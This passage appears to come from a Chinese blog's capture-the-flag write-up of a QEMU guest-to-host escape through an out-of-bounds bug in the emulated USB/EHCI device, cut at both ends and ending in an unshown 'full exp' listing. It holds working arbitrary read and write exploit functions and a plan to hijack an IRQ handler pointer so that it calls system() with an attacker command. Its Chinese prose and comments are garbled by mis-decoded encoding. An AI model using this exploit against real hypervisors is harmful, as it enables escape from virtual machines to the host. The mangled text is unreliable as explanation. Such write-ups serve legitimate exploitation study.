class="hljs-keyword">if</span> (plen &gt; <span class="hljs-number">4096</span> - offset) &#123;<br>            plen = <span class="hljs-number">4096</span> - offset;<br>            offset = <span class="hljs-number">0</span>;<br>            cpage++;<br>        &#125;<br><span class="hljs-comment">// qemu_sglist_addå‡½æ•°çš„ä½œç”¨æ˜¯ä¸ºp-&gt;sglç»“æ„ä½“èµ‹å€¼ï¼Œæ•ˆæœå¦‚ä¸‹</span><br>        <span class="hljs-comment">// sgl-&gt;sg[sgl-&gt;nsg].base = page; </span><br>        <span class="hljs-comment">// sgl-&gt;sg[sgl-&gt;nsg].len = plen;</span><br>        <span class="hljs-comment">// sgl-&gt;size += len</span><br>        qemu_sglist_add(&amp;p-&gt;sgl, page, plen);<br>        bytes -= plen;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>usb_packet_mapå‡½æ•°ä¸»è¦åˆ©ç”¨sglç»“æ„ä½“æ¥å¯¹p-&gt;iovèµ‹å€¼ï¼Œdma_memory_mapä¼šå¯¹<code>sgl-&gt;sg[i].base</code>è¿™ä¸ªå€¼æ“ä½œæ“ä½œï¼Œè¯´æ˜å…¶æ˜¯ç‰©ç†åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´èµ‹å€¼ç»™ sgl-&gt;sg[i].baseçš„qtd.bufpträ¹Ÿæ˜¯ç‰©ç†åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">usb_packet_map</span><span class="hljs-params">(USBPacket *p, QEMUSGList *sgl)</span><br>&#123;<br>    DMADirection dir = (p-&gt;pid == USB_TOKEN_IN) ?<br>        DMA_DIRECTION_FROM_DEVICE : DMA_DIRECTION_TO_DEVICE;<br>    <span class="hljs-type">void</span> *mem;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sgl-&gt;nsg; i++) &#123;<br>        <span class="hljs-type">dma_addr_t</span> base = sgl-&gt;sg[i].base;<br>        <span class="hljs-type">dma_addr_t</span> len = sgl-&gt;sg[i].len;<br><br>        <span class="hljs-keyword">while</span> (len) &#123;<br>            <span class="hljs-type">dma_addr_t</span> xlen = len;<br>            <span class="hljs-comment">// dma_memory_mapçš„ä½œç”¨æ˜¯å°†è™šæ‹Ÿæœºç‰©ç†å†…å­˜åŒºåŸŸæ˜ å°„åˆ°qemuä¸­çš„åˆ†é…ç»™è™šæ‹ŸæœºçœŸå®å†…å­˜</span><br>            mem = dma_memory_map(sgl-&gt;as, base, &amp;xlen, dir);<br>            <span class="hljs-keyword">if</span> (!mem) &#123;<br>                <span class="hljs-keyword">goto</span> err;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (xlen &gt; len) &#123;<br>                xlen = len;<br>            &#125;<br>            <span class="hljs-comment">// qemu_iovec_addçš„ä½œç”¨æ˜¯ä¸ºp-&gt;iovç»“æ„ä½“èµ‹å€¼ï¼Œæ•ˆæœå¦‚ä¸‹</span><br>            <span class="hljs-comment">// p-&gt;iov[p-&gt;niov].iov_base = mem;</span><br>   <span class="hljs-comment">// p-&gt;iov[p-&gt;niov].iov_len = xlen;</span><br>    <span class="hljs-comment">// p-&gt;size += xlen;</span><br>            qemu_iovec_add(&amp;p-&gt;iov, mem, xlen);<br>            len -= xlen;<br>            base += xlen;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err:<br>    usb_packet_unmap(p, sgl);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                   </p><p>è‡³æ­¤æ•´æ˜ç™½p-&gt;iovçš„æ¥æºä»¥åï¼Œ å°±å¯ä»¥é¡ºåˆ©åˆ©ç”¨æ¼æ´äº†ã€‚                               </p><h2 id="è¯†åˆ«æœ¬åœ°çš„PCIè®¾å¤‡"><a href="#è¯†åˆ«æœ¬åœ°çš„PCIè®¾å¤‡" class="headerlink" title="è¯†åˆ«æœ¬åœ°çš„PCIè®¾å¤‡"></a>è¯†åˆ«æœ¬åœ°çš„PCIè®¾å¤‡</h2><p>è™½ç„¶è¿™ä¸€æ­¥å’Œæ¼æ´åˆ©ç”¨å¹¶æ²¡æœ‰å…³ç³»ï¼Œä½†æ˜¯è¿˜æœ‰è¦è¯´æ˜ä¸€ä¸‹ã€‚</p><p>ä½¿ç”¨<code>lspci</code>ï¼Œæ˜¾ç¤ºçš„Classã€vendor_idå’Œdevice_idåçš„16è¿›åˆ¶æ•°å¯ä»¥åˆ¤æ–­PCIè®¾å¤‡ï¼Œå‚æ•°çš„å«ä¹‰å¯ä»¥å‚è€ƒï¼š<a href="https://elixir.bootlin.com/qemu/v4.2.1/source/include/hw/pci/pci_ids.h">https://elixir.bootlin.com/qemu/v4.2.1/source/include/hw/pci/pci_ids.h</a></p><p>è™½ç„¶åœ¨CTFé¢˜ä¸­ç›®æ ‡çš„PCIè®¾å¤‡å¯ä»¥ç›´æ¥é€šè¿‡vendor_idå’Œdevice_idè¯†åˆ«ï¼Œä½†æ˜¯å¯¹çœŸå®çš„ç¯å¢ƒï¼Œå¾ˆå¤šè®¾å¤‡çš„åˆå§‹åŒ–å¼‚å¸¸å¤æ‚ï¼Œå¦‚æœæœ¬åœ°çš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„<code>lspci</code>åŠŸèƒ½ä¸å…¨ï¼Œçœ‹åˆ°ä¸åˆ°æ›´å¤šçš„PCIè®¾å¤‡ä¿¡æ¯ï¼Œè¿™é‡Œä½¿ç”¨qemuçš„monitoråŠŸèƒ½ï¼Œè¿›å…¥monitoræ¨¡å¼ä»¥åè¾“å…¥<code>info pci</code>ï¼Œå°±å¯ä»¥å¾ˆå®¹æ˜“çœ‹åˆ°è¯¦ç»†çš„PCIè®¾å¤‡ä¿¡æ¯ï¼š</p><img src="/img/21/Screenshot 2023-10-09 133124.png" style="zoom:80%;" /><p>â€‹                              </p><p>ä¸è¿‡å¯¹åº”è¿™é‡Œçš„usbè®¾å¤‡ï¼Œåœ¨åˆå§‹åŒ–æ–‡ä»¶ç³»ç»Ÿæ—¶å°±å·²ç»æä¾›äº†ç›¸å…³ä¿¡æ¯ï¼š</p><img src="/img/21/Screenshot 2023-10-09 132609.png" style="zoom:80%;" /><p>â€‹                                                                    </p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="ä»»æ„è¯»å†™"><a href="#ä»»æ„è¯»å†™" class="headerlink" title="ä»»æ„è¯»å†™"></a>ä»»æ„è¯»å†™</h3><p>ç›¸å…³å‡½æ•°ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_in</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:<br>        <span class="hljs-keyword">if</span> (s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN) &#123;<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_out</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:<br>        <span class="hljs-keyword">if</span> (!(s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN)) &#123;<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥æ— è„‘è®¾ç½®s-&gt;setup_lenä¸º0xffffå»è¶Šç•Œè¯»å†…å­˜å®Œå…¨å¯è¡Œï¼Œåªä¸è¿‡æœ‰ç‚¹è´¹å†…å­˜é¡µï¼Œä½†æ˜¯è¿™æ ·å»è¶Šç•Œå†™çš„è¯å¿…ç„¶ä¼šå½±å“åˆ°å†…å­˜ä¸­å…¶å®ƒçš„å˜é‡ï¼Œå¯¼è‡´å‡ºé”™ã€‚</p><p>è¿™é‡Œçš„æ€è·¯æ˜¯å‚è€ƒDe4dCr0wå¸ˆå‚…çš„åšæ³•ï¼Œåšå‡ºäº†ä¸€ç‚¹ä¿®æ”¹ï¼š</p><ol><li>set_lengthå…ˆè®¾ç½®ä¸€ä¸ªæ­£å¸¸å¤§å°çš„s-&gt;setup_lenï¼Œå¦‚æœç›´æ¥è®¾ç½®s-&gt;setup_lenä¸ºè¶Šç•Œçš„å¤§å°ï¼Œç›´æ¥è¿”å›åçš„s-&gt;setup_stateæ²¡æœ‰è®¾ç½®ä¸ºSETUP_STATE_DATAï¼Œæ¥ä¸‹æ¥çš„è¶Šç•Œå†™ä¹Ÿæ— æ³•å®Œæˆ</li><li>set_lengthå†è®¾ç½®ä¸º0x1010</li><li>è¶Šç•Œå†™ï¼Œä¿®æ”¹s-&gt;setup_indexä¸º((size_t)1 &lt;&lt; 32)  - 8  - 0x1010ï¼Œå®Œæˆè¶Šç•Œå†™åæœ‰ <code>s-&gt;setup_index += len</code>ï¼Œæœ€ås-&gt;setup_index &#x3D; ((size_t)1 &lt;&lt; 32)  - 8ï¼Œç”±äºs-&gt;setup_indexä¸ºintç±»å‹ï¼Œè¿™é‡Œå®é™…æ˜¯<code>-8</code>ï¼Œä¸‹ä¸€æ­¥è¶Šç•Œå†™å°±æ˜¯ä»<code>&amp;s-&gt;data_buf - 8</code>å¼€å§‹ï¼Œä¹Ÿå°±æ˜¯ä»s-&gt;setup_bufå¼€å§‹å†™ ï¼›ä¿®æ”¹s-&gt;setup_lenä¸º0x1018ï¼Œè®©å…¶ä¸‹ä¸€æ­¥è¶Šç•Œå†™ä¹Ÿèƒ½è¦†ç›–s-&gt;setup_lenå’Œs-&gt;setup_indexï¼›åŒæ—¶ä¹Ÿè¦ä¿®æ”¹s-&gt;setup_stateä¸ºSETUP_STATE_DATA</li><li>ç»§ç»­è¶Šç•Œå†™ï¼Œä¿®æ”¹ä¸­s-&gt;setup_buf[0]çš„å€¼ä¸ºUSB_DIR_INæˆ–è€…USB_DIR_OUTï¼ˆæœ¬æ¥å°±å¯ä»¥è¶Šç•Œå†™ï¼Œå…¶å®USB_DIR_OUTå¯ä»¥ä¸ç”¨åˆ»æ„è®¾ç½®ï¼‰ï¼Œå¯ä»¥è®©æ¥ä¸‹æ¥çš„do_token_inå’Œdo_token_outé€šè¿‡å¯¹<code>s-&gt;setup_buf[0]</code>çš„åˆ¤æ–­ï¼Œé¡ºåˆ©è°ƒç”¨usb_packet_copyå‡½æ•°ï¼›ä¿®æ”¹s-&gt;setup_indexä¸ºoffset(ç›®çš„åç§»å€¼) - 0x1020ï¼Œ<code>s-&gt;setup_index += len</code>åå°±æ˜¯ç›®æ ‡åç§»ï¼›ä¿®æ”¹s-&gt;setup_lenä¸º(ç›®çš„åç§»å€¼) + size(è¯»å†™çš„å¤§å°)ï¼›ä¿®æ”¹s-&gt;setup_stateä¸ºSETUP_STATE_DATA</li><li>ä¿®æ”¹å‚æ•°æ—¶æ³¨æ„ï¼š<code>if (s-&gt;setup_index &gt;= s-&gt;setup_len)</code>ï¼Œå¦‚æœæ»¡è¶³è¿™ä¸ªåˆ¤æ–­ï¼Œè¶Šç•Œä¿®æ”¹çš„s-&gt;setup_stateå°±ä¼šå¤±æ•ˆ</li><li>æœ€åå°±å¯ä»¥é¡ºåˆ©é€šè¿‡s-&gt;setup_indexæ¥ä»»æ„è¯»å†™å †å†…å­˜äº†</li></ol><p>ä»»æ„è¯»ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arb_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">uint32_t</span> size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_IN; <span class="hljs-comment">//ä¸ºä¸‹ä¸€æ­¥çš„è¶Šç•Œè¯»è®¾ç½®å‚æ•°</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    read_from_usb();<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»»æ„å†™ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">void</span> *payload, <span class="hljs-type">uint32_t</span> payload_size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_OUT;                 <span class="hljs-comment">//ä¸ºä¸‹ä¸€æ­¥çš„è¶Šç•Œå†™è®¾ç½®å‚æ•°</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + payload_size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    <span class="hljs-built_in">memcpy</span>(data_buf, payload, payload_size);<br>    <span class="hljs-comment">//getchar();</span><br>    write_to_usb();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ•´ä½“åˆ©ç”¨"><a href="#æ•´ä½“åˆ©ç”¨" class="headerlink" title="æ•´ä½“åˆ©ç”¨"></a>æ•´ä½“åˆ©ç”¨</h3><p>åœ¨s-&gt;data_buf + 0x2004å¤„å°±å¯ä»¥æ³„æ¼å‡ºå †åœ°å€å’Œqemuåœ°å€</p><img src="/img/21/Screenshot 2023-10-10 215508.png" style="zoom:80%;" /><p>â€‹                                  </p><p>æ³„æ¼å‡ºåœ°å€åæœ‰å¦‚ä¸‹ä¸¤ç§æ–¹æ³•å»å®ç°é€ƒé€¸</p><h4 id="ä¿®æ”¹IRQStateç»“æ„ä½“"><a href="#ä¿®æ”¹IRQStateç»“æ„ä½“" class="headerlink" title="ä¿®æ”¹IRQStateç»“æ„ä½“"></a>ä¿®æ”¹IRQStateç»“æ„ä½“</h4><p>å…·ä½“è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">IRQState</span> &#123;</span><br>    Object parent_obj;<br><br>    qemu_irq_handler handler;<br>    <span class="hljs-type">void</span> *opaque;<br>    <span class="hljs-type">int</span> n;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">IRQState</span> *<span class="hljs-title">qemu_irq</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_set_irq</span><span class="hljs-params">(qemu_irq irq, <span class="hljs-type">int</span> level)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!irq)<br>        <span class="hljs-keyword">return</span>;<br><br>    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_update_irq</span><span class="hljs-params">(EHCIState *s)</span><br>&#123;<br>    <span class="hljs-type">int</span> level = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> ((s-&gt;usbsts &amp; USBINTR_MASK) &amp; s-&gt;usbintr) &#123;<br>        level = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    trace_usb_ehci_irq(level, s-&gt;frindex, s-&gt;usbsts, s-&gt;usbintr);<br>    qemu_set_irq(s-&gt;irq, level);<br>&#125;<br></code></pre></td></tr></table></figure><p>EHCIStateç»“æ„ä½“ä¸­å­˜åœ¨qemu_irqï¼Œehci_opreg_writeå‡½æ•°ä¸­switchçš„é€‰é¡¹æ˜¯USBSTSå°±å¯ä»¥è°ƒç”¨ehci_update_irq(s)ï¼›qemu_irqè¿™ä¸ªç»“æ„ä½“ä¹Ÿåœ¨å †ä¸Šï¼Œæ‰¾åˆ°qemu_irqè¿™ä¸ªç»“æ„ä½“çš„åœ°å€åï¼Œé€šè¿‡ä»»æ„å†™ä¿®æ”¹handlerä¸ºsystemåœ°å€ï¼Œä¿®æ”¹opaqueä¸ºcmdçš„åœ°å€ã€‚</p><p>â€‹                                               </p><p>å®Œæ•´expï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span 